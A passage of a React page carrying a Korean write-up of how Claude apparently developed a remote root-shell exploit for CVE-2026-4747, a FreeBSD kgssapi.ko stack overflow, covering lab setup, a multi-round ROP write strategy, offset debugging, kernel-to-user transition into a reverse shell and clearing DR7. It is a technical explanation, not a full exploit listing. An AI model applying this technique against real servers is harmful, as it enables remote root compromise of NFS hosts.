              각 오버플로우는 NFS 커널 스레드 하나를 가로챕니다. Claude는
              <code>kthread_exit()</code>을 사용해 각 스레드를 정상적으로
              종료시켰고, 서버가 다음 라운드를 받을 수 있도록 살아 있게
              유지했습니다.
            </p>
          </li>
          <li>
            <strong>오프셋 디버깅</strong>
            <p>
              디스어셈블리에서 계산한 초기 스택 오프셋은 틀렸습니다. Claude는
              De Bruijn 패턴을 보내고 크래시 덤프를 읽은 뒤 정확한 오프셋을 다시
              계산했습니다. 흔한 기법이지만, 우리는 이 writeup을 읽기 전까지 그
              이름을 들어 본 적이 없었습니다.
            </p>
          </li>
          <li>
            <strong>커널에서 사용자 공간으로 전환</strong>
            <p>
              NFS 스레드는 사용자 공간 프로그램을 직접 실행할 수 없습니다.
              Claude는 <code>kproc_create()</code>로 새 프로세스를 만들고,
              <code>kern_execve()</code>로 <code>/bin/sh</code>를 실행한 뒤,
              프로세스가 사용자 모드로 넘어갈 수 있도록 <code>P_KPROC</code>
              플래그를 지웠습니다.
            </p>
          </li>
          <li>
            <strong>하드웨어 브레이크포인트 버그</strong>
            <p>
              자식 프로세스가 디버그 예외로 계속 죽는 문제가 있었습니다. Claude는
              이것이 DDB에서 상속된 오래된 디버그 레지스터 때문임을 추적했고,
              포크 전에 DR7을 지워 문제를 해결했습니다.
            </p>
          </li>
        </ol>
        <p>아직 머리가 터지지 않았다면, 이제 자세한 내용을 보겠습니다.</p>
      </section>

      <section className="advisory-section">
        <h3>배경</h3>
        <p>
          CVE-2026-4747은 FreeBSD의 <code>kgssapi.ko</code> 커널 모듈에 있는
          원격 커널 코드 실행 취약점입니다. 이 모듈은 NFS용 RPCSEC_GSS 인증을
          구현합니다. 버그 자체는 전형적인 스택 버퍼 오버플로우입니다.
          <code>svc_rpc_gss_validate()</code>가 공격자가 제어하는 credential
          body를 길이 확인 없이 128바이트 스택 버퍼인 <code>rpchdr[]</code>로
          복사합니다.
        </p>
        <p>
          이 버퍼 중 32바이트는 이미 RPC 헤더 필드가 사용하고 있으므로 실제로
          남는 공간은 96바이트뿐입니다. 하지만 XDR 계층은 credential을 최대
          400바이트까지 허용합니다. 결과적으로 버퍼 뒤로 304바이트를 넘쳐 쓸 수
          있습니다.
        </p>
        <p>
          오버플로우는 NFS 워커 스레드의 커널 컨텍스트, 즉 ring 0에서 발생합니다.
          따라서 RIP를 제어하면 완전한 커널 코드 실행이 됩니다. 다만 취약한
          <code>memcpy</code>에 도달하려면 유효한 Kerberos GSS 컨텍스트가
          필요합니다. 공격자는 NFS 서비스 principal에 대한 유효한 Kerberos
          티켓을 하나 가지고 있어야 하며, 그 티켓은 권한이 낮아도 됩니다.
        </p>
        <p>
          Claude는 이런 교과서적인 스택 버퍼 오버플로우에서 출발해, 안정적으로
          동작하는 15라운드 원격 루트 셸을 만들었습니다. 아래는 해결된 핵심
          작업들을 대략적인 순서대로 정리한 것입니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>0단계: 랩 구성</h3>
        <p>
          익스플로잇 개발에 들어가기 전, Claude는 FreeBSD 14.4-RELEASE VM으로
          작동하는 테스트 환경을 만들어야 했습니다. 취약한 코드 경로에 네트워크로
          실제로 도달할 수 있어야 했기 때문입니다. 필요한 작업은 다음과
          같았습니다.
        </p>
        <ul className="advisory-list">
          <li>
            <strong>CPU 2개 이상</strong>으로 FreeBSD를 설치합니다. CPU 하나당
            NFS 스레드가 8개 생기고, 익스플로잇은 15라운드가 필요하므로 CPU 1개로는
            충분하지 않습니다.
          </li>
          <li>
            <code>kgssapi.ko</code>를 로드하고 NFS 서버를 2049/TCP 포트에서
            활성화합니다.
          </li>
          <li>
            VM 안에 <strong>MIT Kerberos KDC</strong>를 세우고, 서비스 principal
            (<code>nfs/test@TEST.LOCAL</code>)을 만들고, keytab을 추출합니다.
            취약한 <code>memcpy</code>는 완전히 인증된 RPCSEC_GSS 코드 경로에서만
            도달할 수 있기 때문입니다.
          </li>
          <li>
            공격자 호스트의 <code>/etc/krb5.conf</code>에 <code>rdns = false</code>와
            <code>dns_canonicalize_hostname = false</code>를 설정합니다. 그렇지 않으면
            MIT Kerberos가 역방향 DNS로 대상 호스트 이름을 정규화해
            <code>nfs/test@TEST.LOCAL</code>이 아니라 <code>nfs/localhost@TEST.LOCAL</code>
            티켓을 만들 수 있습니다. 서버는 이 불일치를
            <code>KRB5KRB_AP_WRONG_PRINC</code>로 거부하고, 오버플로우에는 도달하지
            못합니다.
          </li>
          <li>
            QEMU 사용자 모드 NAT로 호스트 2049를 게스트 2049에, 호스트 8888을
            게스트 88에 포워딩해 공격자가 NFS와 KDC에 모두 접근할 수 있게 합니다.
          </li>
          <li>
            QEMU를 <code>-nographic</code>으로 실행해 커널 패닉 출력이 Claude가
            읽을 수 있는 로그 파일로 들어가게 합니다. Claude는 이 방식으로 De
            Bruijn 패턴에서 나온 크래시 레지스터 값을 확인했습니다.
          </li>
        </ul>
        <p>
          Kerberos 구성은 만만한 작업이 아니었습니다. 취약점은 오버플로우가
          발생하기 전에 유효한 GSS 컨텍스트를 요구하므로, 익스플로잇 개발을
          시작하기 전에 KDC, principal, keytab, 티켓 발급까지 Kerberos 인프라가
          끝까지 정상 동작해야 했습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>1단계: 여러 패킷으로 전달하는 전략</h3>
        <p>
          핵심 제약은 XDR 계층이 credential을 400바이트로 제한한다는 점입니다.
          GSS 헤더, 패딩, 저장된 레지스터를 빼고 나면 ROP 체인에 쓸 수 있는
          공간은 약 200바이트뿐입니다. 셸코드는 432바이트였으므로 한 패킷에
          들어갈 수 없었습니다.
        </p>
        <p>
          Claude의 해법은 익스플로잇을 <strong>단계적 쓰기 루프</strong>처럼
          다루는 것이었습니다. 1라운드는 ROP로 <code>pmap_change_prot()</code>를
          호출해 커널 BSS를 쓰기 가능하고 실행 가능하게 만듭니다. 2라운드부터
          15라운드까지는 <code>pop rdi / pop rax / mov [rdi], rax</code> primitive를
          사용해 패킷마다 셸코드 32바이트를 BSS에 씁니다. 마지막 라운드는 남은
          바이트를 쓰고 셸코드로 점프합니다. 이렇게 하면 200바이트짜리 빠듯한 ROP
          예산을 사실상 무제한 쓰기 primitive로 바꿀 수 있습니다. 대신 패킷을 더
          많이 보내야 합니다.
        </p>
        <p>
          8바이트 쓰기 한 번에는 ROP 체인 40바이트가 필요했습니다. 가젯 3개와
          immediate 2개가 들어가기 때문입니다. 라운드당 4번 쓰면 160바이트이고,
          깔끔한 종료에 필요한 24바이트를 더해 184바이트가 되어 200바이트 예산
          안에 들어갑니다. 5번 쓰기는 224바이트가 필요하므로 너무 큽니다.
        </p>
        <p>
          Claude는 각 라운드가 NFS 스레드 하나를 죽인다는 점도 파악했습니다.
          FreeBSD가 CPU 하나당 스레드 8개를 만든다는 사실을 계산해, 전체
          15라운드를 버티려면 VM에 CPU가 2개 이상 필요하다고 판단했습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>2단계: 패닉을 피하는 깔끔한 스레드 종료</h3>
        <p>
          스택 오버플로우로 RIP를 가로챘을 때 당연히 생기는 문제는 ROP 체인이
          끝난 뒤 무엇이 일어나느냐입니다. 정상적으로 리턴하려고 하면 망가진
          스택에서 엉뚱한 값을 pop하다가 커널 패닉이 납니다. Claude는 모든 ROP
          체인의 끝을 <code>kthread_exit(0)</code>으로 마무리했습니다. 이렇게 하면
          현재 NFS 워커 스레드가 정상 종료됩니다. 커널은 패닉에 빠지지 않고, NFS
          스레드가 하나 줄어들 뿐입니다. NFS 서버는 계속 살아 있고 다음 라운드의
          연결을 받을 수 있습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>3단계: De Bruijn 패턴으로 RIP 오프셋 디버깅</h3>
        <p>
          정적 디스어셈블리로 계산한 초기 값은 credential byte 168에서 RIP가
          덮인다는 것이었습니다. 하지만 실제로는 아니었습니다. 익스플로잇은 엉뚱한
          곳에서 크래시하거나 아예 크래시하지 않았습니다. Claude는 credential
          body로 De Bruijn cyclic pattern을 보냈고, 커널 패닉 뒤 QEMU 콘솔 로그에서
          faulting instruction pointer를 읽었으며, 그 8바이트 값을 패턴에서 다시
          찾아냈습니다. 정답은 168이 아니라 <strong>200바이트</strong>였습니다.
        </p>
        <p>
          32바이트 차이는 GSS 헤더 때문이었습니다. version, procedure, sequence,
          service, 16바이트 handle이 credential body에 포함되어 있었고, 정적
          디스어셈블리 분석에서는 이 점을 반영하지 못했습니다.
        </p>
        <p>
          De Bruijn sequence는 모든 n바이트 부분 문자열이 고유하다는 성질을
          가집니다. 흔히 쓰는 오프셋 계산 기법에 붙은 조금 멋진 이름입니다. 커널이
          잘못된 리턴 주소 때문에 패닉에 빠지면 FreeBSD는 콘솔에 trap frame dump를
          출력합니다.
        </p>
        <pre><code>{`Fatal trap 12: page fault while in kernel mode
instruction pointer     = 0x20:0x6941624162413941
frame pointer           = 0x28:0x4130624139614839`}</code></pre>
        <p>
          각 레지스터 값은 패턴 안의 정확히 한 오프셋에 대응합니다. 크래시 한 번만
          있으면 동시에 덮인 여러 레지스터의 오프셋을 알 수 있습니다. Claude는
          QEMU 출력을 로그 파일로 넘겨 두었기 때문에, 파일 읽기 도구로 크래시
          덤프를 읽고 오프셋을 프로그램으로 계산할 수 있었습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>4단계: 커널에서 사용자 모드로 전환</h3>
        <p>
          이것이 가장 깊은 기술적 난관이었습니다. 셸코드는 가로챈 NFS 스레드에서
          실행됩니다. 이 스레드는 순수한 커널 스레드이므로 사용자 vmspace도,
          trapframe도, 사용자 공간으로 돌아갈 <code>iretq</code> 경로도 없습니다.
          그냥 <code>execve()</code>를 호출할 수는 없습니다.
        </p>
        <p>Claude의 해법은 두 단계 설계였습니다.</p>
        <ul className="advisory-list">
          <li>
            <strong>1단계, entry:</strong> 내부적으로 <code>fork1()</code>을 호출하는
            <code>kproc_create()</code>를 호출해 proc, thread, vmspace, trapframe을
            모두 갖춘 완전히 새로운 프로세스를 만듭니다. 그런 다음
            <code>kthread_exit()</code>으로 NFS 스레드를 죽입니다.
          </li>
          <li>
            <strong>2단계, worker:</strong> 새 프로세스 안에서 <code>fork_exit</code>
            콜백으로 실행되며, <code>kern_execve("/bin/sh", "-c", REVSHELL)</code>를
            호출합니다. 이 호출은 ELF 바이너리를 로드하고 사용자 모드 RIP, RSP,
            CS, SS가 들어간 trapframe을 준비한 뒤 <code>EJUSTRETURN</code>을
            반환합니다. 이후 <strong><code>P_KPROC</code> 플래그를 지웁니다.</strong>
            이 플래그를 지우지 않으면 <code>fork_exit()</code>이
            <code>kthread_exit()</code>을 호출해 프로세스가 사용자 공간에 도달하기
            전에 죽습니다. 플래그를 지우면 <code>fork_exit()</code>은 정상 경로인
            <code>userret()</code>, <code>doreti</code>, <code>iretq</code>를 지나
            CPU가 ring 3로 전환되고, <code>/bin/sh</code>가 uid 0으로 실행됩니다.
          </li>
        </ul>
        <p>반환 경로를 조금 더 자세히 보면 다음과 같습니다.</p>
        <ol className="advisory-steps">
          <li>
            <code>kern_execve()</code>가 프로세스의 새 vmspace에 <code>/bin/sh</code>를
            로드합니다.
          </li>
          <li>
            스레드의 trapframe을 설정합니다. <code>tf_rip</code>는 ELF entry point,
            <code>tf_rsp</code>는 사용자 스택, <code>tf_cs</code>와 <code>tf_ss</code>는
            사용자 모드 세그먼트(CPL 3)가 됩니다.
          </li>
          <li>
            worker가 <code>P_KPROC</code>(<code>proc-&gt;p_flag</code>의 0x04 비트)를
            지우고 <code>fork_exit()</code>으로 돌아갑니다.
          </li>
          <li>
            <code>fork_exit()</code>이 <code>userret(td)</code>를 호출해 신호를
            처리하고 세그먼트를 조정합니다.
          </li>
          <li>
            <code>fork_exit()</code>이 <code>doreti</code>로 돌아가고, 거기서
            <code>iretq</code>가 실행됩니다.
          </li>
          <li>
            <code>iretq</code>가 trapframe을 pop하면서 CPU가 ring 0에서 ring 3로
            전환됩니다.
          </li>
          <li>
            <code>/bin/sh</code>가 사용자 공간에서 uid 0으로 실행되고 리버스 셸
            명령을 실행합니다.
          </li>
        </ol>
      </section>

      <section className="advisory-section">
        <h3>5단계: 하드웨어 브레이크포인트 미스터리, DR7과 DDB</h3>
        <p>
          셸코드 실행, <code>kproc_create</code> 성공, <code>ps</code>에서 보이는
          프로세스 이름까지 모두 정상처럼 보였는데도 worker가 계속 <strong>trap 1</strong>, 즉 debug exception으로 죽었습니다. 그것도 완전히
          유효한 명령어에서 크래시했습니다. 말이 되지 않는 상황이었습니다.
        </p>
        <p>
          Claude는 이것을 상속된 부작용으로 추적했습니다. 익스플로잇 개발 중
          이전 실패 시도들이 커널 패닉을 일으켜 <strong>DDB</strong>,
          FreeBSD의 커널 디버거로 떨어진 적이 있었습니다. DDB는 x86 debug register에
          하드웨어 브레이크포인트를 설정합니다. DR0-DR3은 주소를, DR7은 제어 값을
          담습니다. 이 레지스터들은 스레드의 PCB(Process Control Block)에 저장됩니다.
          <code>kproc_create</code>가 <code>fork1()</code>을 호출해 부모의 PCB를
          자식에게 복사하면, 자식도 오래된 브레이크포인트를 물려받습니다. worker
          코드가 감시 중인 주소를 건드리는 순간 CPU가 debug exception을 발생시켰고,
          결국 trap 1 패닉이 났습니다.
        </p>
        <p>
          해결책은 <code>kproc_create</code> 전에 entry 셸코드에 두 명령을 넣는
          것이었습니다.
        </p>
        <pre><code>{`xor eax, eax
mov dr7, rax      ; 모든 하드웨어 브레이크포인트 비활성화`}</code></pre>
        <p>
          DR7은 제어 레지스터입니다. 이 값을 0으로 만들면 DR0-DR3을 하나씩 지우지
          않아도 네 개의 브레이크포인트가 모두 비활성화됩니다. 덕분에 DDB가 부모
          스레드에 무엇을 남겼든, 자식 프로세스는 깨끗한 디버그 레지스터로
          시작하게 됩니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>결론</h3>
        <p>
          컴퓨터는 오래전부터 소프트웨어 버그를 찾아 왔습니다. AFL이나 syzkaller
          같은 퍼저는 10년 넘게 커널 취약점을 발견해 왔습니다. 하지만 버그를 찾는
          것과 익스플로잇하는 것은 전혀 다른 일입니다. 익스플로잇 개발에는 운영체제
          내부 구조에 대한 이해, ROP 체인 구성, 메모리 레이아웃 관리, 크래시 디버깅,
          예상과 다르게 흘러갈 때의 적응이 필요합니다. 오랫동안 이 지점은 사람만
          넘어설 수 있는 경계로 여겨졌습니다.
        </p>
        <p>
          새로운 AI 능력이 나올 때마다 사람들은 보통 "AI는 Y는 할 수 있지만 X는
          사람만 할 수 있다"고 말합니다. 그런데 X가 익스플로잇 개발이라면, 그
          경계는 이제 움직였습니다.
        </p>
        <p>
          <a href="https://github.com/califio/publications/tree/main/MADBugs/CVE-2026-4747" target="_blank" rel="noopener noreferrer">
            https://github.com/califio/publications/tree/main/MADBugs/CVE-2026-4747
          </a>
        </p>
      </section>
    </article>
  );
}

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
);
